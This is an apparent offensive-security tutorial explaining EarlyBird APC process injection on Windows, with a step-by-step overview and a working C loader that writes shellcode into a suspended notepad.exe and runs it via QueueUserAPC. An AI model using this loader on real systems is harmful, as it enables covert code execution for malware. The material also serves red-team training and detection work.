
# EarlyBird APC Code Injection

## Introduction

Welcome to this article! Today, we’ll explore the **EarlyBird APC Code Injection** technique. This method revolves around creating a process in a suspended state, injecting shellcode into its APC (Asynchronous Procedure Call) queue, and then resuming the thread to trigger execution. It gives precise control over when the shellcode is executed.

## Understanding APC Injection

APC Injection is a known technique under process injection methods, such as remote thread injection. To summarize:

- Threads operate inside processes and can execute code asynchronously using APC queues.
- Each thread maintains its own APC queue.
- Applications can enqueue functions (APCs) to run in a thread, provided they have the appropriate privileges.
- Queued APCs execute when the thread enters an alertable state.

> Note: For understanding APC Injection, [kindly refer](https://0x00sec.org/t/process-injection-apc-injection/24608)

**Key Difference:**  
While traditional APC Injection targets existing remote processes, **EarlyBird** differs by creating a fresh process (e.g., `calc.exe`) in a suspended state, giving full control over timing.

![image](https://github.com/user-attachments/assets/4d4a50fd-96cb-445a-8730-1aa0b9c3731a)

## Earlybird 

[Early Bird APC Code Injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

### High Level Overview of the technique:

1. Create a legitimate process (e.g., `notepad.exe`) in a suspended state.
2. Allocate memory in the target process.
3. Write your shellcode into this allocated memory.
4. Queue the shellcode as an APC to the main thread.
5. Resume the suspended thread, executing your shellcode.

![image](https://github.com/user-attachments/assets/b9ca9d15-6a84-4fc1-bd0f-3a0fd22c6d9b)

## Code Example

```c
int main(void) {
    int pid = 0;
    HANDLE hProc = NULL;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    void *pRemoteCode;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

    ResumeThread(pi.hThread);

    return 0;
}
```

## Proof of Concept

![image](https://github.com/user-attachments/assets/3262ebb5-cade-46a6-956c-b3be7c4d5c97)

Once executed, the shellcode runs within the context of `notepad.exe`, confirmed by the MessageBox originating from that process.

## Conclusion

EarlyBird APC Injection is a highly effective method for process injection, offering fine control over code execution. It remains a favored technique in malware development and red teaming exercises.
Thanks for reading!

— **Malforge Group**
